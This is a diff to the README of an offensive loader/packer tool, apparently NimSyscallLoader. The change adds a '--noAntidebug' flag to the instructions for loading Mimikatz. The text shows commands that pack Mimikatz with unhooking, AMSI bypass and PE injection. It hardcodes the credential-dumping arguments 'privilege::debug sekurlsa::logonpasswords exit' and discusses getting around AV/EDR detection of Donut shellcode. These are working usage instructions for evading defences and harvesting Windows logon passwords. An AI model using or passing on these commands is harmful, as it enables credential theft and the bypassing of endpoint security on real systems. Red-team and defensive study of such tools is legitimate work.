@@ -284,7 +284,7 @@ NimSyscallLoader --file=mimikatz.exe --unhook --noAMSI --peinject
 
 Some of you had problems loading Mimikatz with the packer via "--file=Mimikatz --peload" arguments to afterwards issue custom commands on runtime.
 
-I found the reason for this behaviour. Don't ask me why but you cannot just take the release from Github but have to compile Mimikatz on your own (or build a custom version) and load this instead of the official release.
+I found the reason for this behaviour. Don't ask me why but you cannot just take the release from Github but have to compile Mimikatz on your own (or build a custom version) and load this instead of the official release. Also use `--noAntidebug` for Mimikatz as if not it has strange results (dont ask me why, other PE's are loaded fine).
 
 If you still want to embed the release version from github you can directly pass arguments like this:
 
@@ -295,7 +295,7 @@ Packedmimikatz.exe coffee exit
 You can also hardcode arguments for `--peload`, `--csharp` or `--peinject` payloads, e.g. the following would patch the command line arguments to be `privilege::debug sekurlsa::logonpasswords exit`:
 
 ```batch
-NimSyscallLoader --file mimikatz.exe --peload --RWX --arguments "privilege::debug sekurlsa::logonpasswords exit"
+NimSyscallLoader --file mimikatz.exe --peload --RWX --arguments "privilege::debug sekurlsa::logonpasswords exit" --noAntidebug
 ``` 
 
 Donut shellcode is detected by some AV/EDR vendors. As alternative for PE-Loading I modified my [Nim-RunPE](https://github.com/S3cur3Th1sSh1t/Nim-RunPe) to use Syscalls for PE-Loading and integrated it here:
